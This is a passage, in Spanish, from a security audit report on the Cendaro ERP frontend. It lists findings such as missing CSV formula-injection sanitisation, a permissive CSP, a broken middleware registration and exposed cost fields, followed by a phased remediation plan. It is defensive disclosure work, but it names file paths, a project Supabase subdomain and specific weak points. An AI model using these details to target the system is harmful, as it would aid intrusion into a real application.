- La ingestión de hojas de cálculo (`.xlsx`) en `apps/erp/src/lib/parse-file-browser.ts` y `modules/catalog-import` deshabilita de manera segura la evaluación de fórmulas en lectura (`cellFormula: false`, `cellHTML: false`, `cellStyles: false`).
- La versión de SheetJS (`xlsx`) se encuentra fijada en `0.20.3` con hash de integridad en el lockfile, mitigando los CVEs históricos de Prototype Pollution previos a v0.19.3.
- No obstante, la generación y exportación de archivos carece de sanitización contra **Inyección de Fórmulas (CSV Injection)** (Hallazgo **SEC-FE-04**), y la extracción de imágenes en cliente carece de cuotas contra bombas de descompresión (Hallazgo **SEC-FE-05**).

### 3.5 Cabeceras de Seguridad y Protecciones de Navegador

- En `next.config.js` se inyectan cabeceras globales robustas: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin`, `Strict-Transport-Security` con `includeSubDomains; preload` y `Permissions-Policy`.
- La debilidad detectada radica en la configuración de la CSP (`csp.mjs`), que mantiene `'unsafe-inline'` y autoriza el comodín `https://*.supabase.co` en `connect-src` e `img-src` (Hallazgo **SEC-FE-06**).

---

## 4. Plan de Remediación Priorizado

```
+---------------------------------------------------------------------------------------+
| FASE 1: REMEDIACIÓN CRÍTICA INMEDIATA (Día 1 - Bloqueante de Despliegue)             |
+---------------------------------------------------------------------------------------+
  [x] R-01: Restaurar Next.js Edge Middleware vinculando apps/erp/src/middleware.ts       |
            hacia proxy.ts para habilitar de inmediato la protección de rutas ERP.        |
  [x] R-02: Eliminar Product.costAvg y ProductSupplier.cost de catalog.productById       |
            para roles que no pertenezcan a MANAGEMENT (pricing:read).                  |
  [x] R-03: Aplicar vendorScopeId(ctx) en fiscal.listInvoices para aislar facturas        |
            fiscales por vendedor asignado.                                             |

+---------------------------------------------------------------------------------------+
| FASE 2: HARDENING DE DATOS Y ENTORNO DE CLIENTE (Día 2 - Día 3)                       |
+---------------------------------------------------------------------------------------+
  [x] R-04: Implementar sanitización de fórmulas (=, +, -, @) en todas las              |
            exportaciones de hojas de cálculo en apps/erp/src/lib/xlsx/workbook.ts.     |
  [x] R-05: Restringir CSP connect-src e img-src al subdominio específico de Supabase   |
            del proyecto (https://ljwoptpaxazqmnhdczsb.supabase.co).                    |
  [x] R-06: Añadir límites de entradas y bytes a extractImagesFromXlsx en navegador.     |

+---------------------------------------------------------------------------------------+
| FASE 3: DEFENSA EN PROFUNDIDAD Y RESILIENCIA (Día 4 - Día 5)                         |
+---------------------------------------------------------------------------------------+
  [x] R-07: Incorporar isTrustedOrigin en api/trpc/[...trpc] y parse-packing-list.      |
  [x] R-08: Aplicar rateLimit por IP en /api/bcv-rate y /api/exchange/usd-cny.           |
  [x] R-09: Implementar prueba automatizada en CI que verifique middleware-manifest.json.|
+---------------------------------------------------------------------------------------+
```

---

## 5. Conclusión de la Auditoría

El ERP Cendaro cuenta con excelentes componentes de seguridad defensiva a nivel de autenticación (login con tiempo constante, rate-limiting composite, validación de Turnstile, protección contra Open Redirects y aislamiento de variables de entorno). Sin embargo, la presencia de la brecha crítica en el registro del middleware (`proxy.ts`) y la serialización indiscriminada de entidades de base de datos completas en los payloads RSC desprotege el perímetro frontal de la aplicación.

La ejecución del plan de remediación técnico detallado en este informe cerrará de forma integral estos vectores, elevando el nivel de madurez de seguridad del ERP al estándar enterprise OWASP ASVS Nivel 2.
